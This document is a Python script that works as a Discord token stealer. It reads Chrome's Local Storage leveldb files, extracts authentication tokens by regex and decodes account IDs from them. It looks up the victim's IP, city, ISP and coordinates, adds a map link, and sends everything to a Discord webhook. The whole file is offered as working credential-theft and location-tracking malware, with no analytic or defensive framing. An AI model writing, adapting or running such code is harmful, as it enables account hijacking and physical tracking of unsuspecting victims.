import requests
import json
import re
import os
import base64
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url_here"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}
TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"

def translate_to_english(text):
    if not text or text == "N/A":
        return text
    try:
        r = requests.get("https://api.mymemory.translated.net/get", params={"q": text, "langpair": "zh|en"}, timeout=5)
        return r.json()["responseData"]["translatedText"] or text
    except:
        return text

def make_post_request(api_url, data):
    try:
        req = urllib.request.Request(api_url, data=json.dumps(data, ensure_ascii=False).encode("utf-8"), headers=REQUEST_HEADERS)
        with urllib.request.urlopen(req) as res:
            return res.status
    except:
        return -1

def get_tokens_from_file(file_path):
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as f:
            return re.findall(TOKEN_REGEX_PATTERN, f.read()) or None
    except:
        return None

def get_user_id_from_token(token):
    try:
        return base64.b64decode(token.split(".", maxsplit=1)[0] + "==").decode("utf-8")
    except:
        return None

def get_tokens_from_path(base_path):
    try:
        file_paths = [os.path.join(base_path, f) for f in os.listdir(base_path)]
    except:
        return {}
    id_to_tokens = {}
    for fp in file_paths:
        tokens = get_tokens_from_file(fp)
        if not tokens:
            continue
        for t in tokens:
            uid = get_user_id_from_token(t)
            if not uid:
                continue
            id_to_tokens.setdefault(uid, set()).add(t)
    return id_to_tokens

def get_ip_location():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://www.bilibili.com/",
        "Origin": "https://www.bilibili.com"
    }
    endpoints = [
        "https://api.bilibili.com/x/web-interface/zone",
        "https://api.live.bilibili.com/client/v1/Ip/getInfoNew"
    ]
    ip_info = None
    for url in endpoints:
        try:
            r = requests.get(url, headers=headers, timeout=10)
            d = r.json()
            if d.get("code") == 0:
                ip_info = d.get("data", {})
                break
        except:
            continue
    if not ip_info:
        return None
    result = {
        "IP Address": ip_info.get("addr", "N/A"),
        "Country": translate_to_english(ip_info.get("country", "N/A")),
        "Province": translate_to_english(ip_info.get("province", "N/A")),
        "City": translate_to_english(ip_info.get("city", "N/A")),
        "ISP": ip_info.get("isp", "N/A"),
        "Latitude": ip_info.get("latitude", "N/A"),
        "Longitude": ip_info.get("longitude", "N/A"),
        "Country Code": ip_info.get("country_code", "N/A") if "country_code" in ip_info else "N/A"
    }
    lat, lon = result.get("Latitude"), result.get("Longitude")
    result["Google Maps URL"] = "N/A" if lat == "N/A" or lon == "N/A" else f"https://www.google.com/maps?q=loc:{float(lat)},{float(lon)}"
    return result

def send_to_webhook(location, tokens):
    field_order = ["IP Address", "Country", "Province", "City", "ISP", "Latitude", "Longitude", "Country Code", "Google Maps URL"]
    fields = [{"name": f"**{k}:**", "value": str(location[k])} for k in field_order if k in location] if location else [{"name": "**Location:**", "value": "Failed to retrieve location"}]

    if tokens:
        for uid, ts in tokens.items():
            tl = "\n".join(ts)
            if len(tl) > 1000:
                tl = tl[:980] + "... (truncated)"
            fields.append({"name": "**User ID:**", "value": f"User ID: {uid}\n**Tokens:**\n{tl}"})
    else:
        fields.append({"name": "**User ID:**", "value": "None found\n**Tokens:**\nNone"})

    embeds = [{"title": "IP Location and Tokens", "fields": fields}]
    if len(json.dumps({"content": "IP Location and Tokens", "embeds": embeds}, ensure_ascii=False)) > 6000:
        embeds[0]["fields"][-1]["value"] = "User ID: (see earlier fields)\n**Tokens:**\nToo many to display"

    make_post_request(WEBHOOK_URL, {"content": "IP Location and Tokens", "embeds": embeds})

def main():
    tokens = get_tokens_from_path(os.path.join(os.getenv("LOCALAPPDATA", ""), r"Google\Chrome\User Data\Default\Local Storage\leveldb"))
    location = get_ip_location()
    send_to_webhook(location, tokens)

if __name__ == "__main__":
    main()
